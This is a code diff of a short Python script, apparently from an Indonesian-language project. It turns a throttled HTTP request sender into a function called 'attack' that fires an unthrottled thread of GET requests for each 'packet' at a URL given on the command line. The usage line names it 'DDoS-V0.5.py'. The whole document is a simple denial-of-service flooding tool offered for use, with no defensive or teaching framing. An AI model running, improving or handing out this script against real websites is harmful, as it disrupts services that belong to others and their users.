@@ -1,21 +1,22 @@
 import threading
-import time
 import requests
+import sys
 
-def send_custom_requests(target_url, method="POST", data=None, headers=None, requests_per_second=5, duration=5):
-    def send_request():
+def attack(url, packet_count):
+    def send():
         try:
-            if method.upper() == "POST":
-                res = requests.post(target_url, data=data, headers=headers, timeout=5)
-            else:
-                res = requests.get(target_url, params=data, headers=headers, timeout=5)
-            print(f"[{res.status_code}] => Request sent")
-        except Exception as e:
-            print(f"[ERROR] {e}")
+            requests.get(url)
+            print(f"[+] Packet terkirim ke {url}")
+        except:
+            print("[-] Gagal mengirim request")
 
-    interval = 1 / requests_per_second
-    total_requests = int(requests_per_second * duration)
+    for _ in range(int(packet_count)):
+        threading.Thread(target=send).start()
 
-    for _ in range(total_requests):
-        threading.Thread(target=send_request).start()
-        time.sleep(interval)
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Cara pakai: python DDoS-V0.5.py http://<ip/web> <jumlah_packet>")
+    else:
+        target_url = sys.argv[1]
+        packets = sys.argv[2]
+        attack(target_url, packets)
